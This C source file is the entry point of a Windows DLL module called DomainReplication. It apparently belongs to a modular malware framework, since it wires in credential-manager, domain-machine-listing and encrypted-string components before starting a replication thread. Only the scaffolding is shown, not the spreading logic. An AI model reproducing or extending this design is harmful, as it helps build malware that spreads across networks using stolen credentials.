/*
	mod_DomainReplication.c
	Main file for module DomainReplication
	NB: configuration of this project defines ROUTINES_BY_PTR, so all libs will use definition of a ptr instead of code itself,
	and it is essential to perform proper initialization of all pointers, received from main (core) module

*/


// perform essential compiler settings
// remove stdlib 
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib") 
#pragma comment(linker, "/NODEFAULTLIB:MSVCRT.lib")
#pragma comment(linker, "/NODEFAULTLIB:MSVCRTD.lib")
#pragma comment(linker, "/NODEFAULTLIB:libcmtd.lib")


#include <windows.h>

#include "..\inc\dbg.h"
#include "..\shared\ModuleAPI.h"

#include "DomainReplication.h"





#if defined(_M_X64)
	// x64 system libs
	#pragma comment (lib, "..\\lib\\amd64\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\amd64\\ntdll.lib")
#elif defined(_M_IX86)
	// x32 system libs
	#pragma comment (lib, "..\\lib\\i386\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\i386\\ntdll.lib")
#else
	#error Unknown target CPU, no system libs can be found
#endif



#include "mod_DomainReplication.h"

/*
	Imports init function, should contain calls to ALL modules which is used by internal calls (reference build output to check
	which modules are compiled in ROUTINES_BY_PTR when particular module is being build)
*/
BOOL modInitImports(CORE_APIS *pCoreAPIs)
{
	BOOL bRes = TRUE;	// ok by default

	HashedStrings_resolve(pCoreAPIs->HashedStrings_apis);
//	PipeWorks_resolve(pCoreAPIs->PipeWorks_apis);	// direct use here
	DomainListMachines_resolve(pCoreAPIs->DomainListMachines_apis);
	CredManager_resolve(pCoreAPIs->CredManager_apis);
	EmbeddedResources_resolve(pCoreAPIs->EmbeddedResources_apis);
	MyStringRoutines_resolve(pCoreAPIs->MyStringRoutines_apis);
	CryptoStrings_resolve(pCoreAPIs->CryptoStrings_apis);
	RndClass_resolve(pCoreAPIs->RndClass_apis);
//	MailslotWorks_resolve(pCoreAPIs->MailslotWorks_apis); // is really used?
//	DataCallbackManager_resolve(pCoreAPIs->DataCallbackManager_apis);	// is really used?

	return bRes;
}

/*
	Routine to be execute when all init are finished
*/
DWORD WINAPI thrModuleRun(LPVOID lpParameter)
{
	DbgPrint("entered");

	infStartDomainReplication();

	DbgPrint("finished");

	return 0;
}



// entrypoint function for module
BOOL WINAPI DllEntry(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	BOOL bRes = TRUE;	// need return TRUE to proceed next
	CORE_APIS *pCoreAPIs = (CORE_APIS *)lpvReserved;
	DWORD dwThreadId;

	if (fdwReason == DLL_PROCESS_ATTACH) {

		DbgPrint("DLL_PROCESS_ATTACH: entered");

		// do apis init in ALL used modules 
		modInitImports(pCoreAPIs);

		// start work thread
		CloseHandle(CreateThread(NULL, 0, thrModuleRun, NULL, 0, &dwThreadId));

		DbgPrint("DLL_PROCESS_ATTACH: done");

	}	// DLL_PROCESS_ATTACH

	return bRes;
}






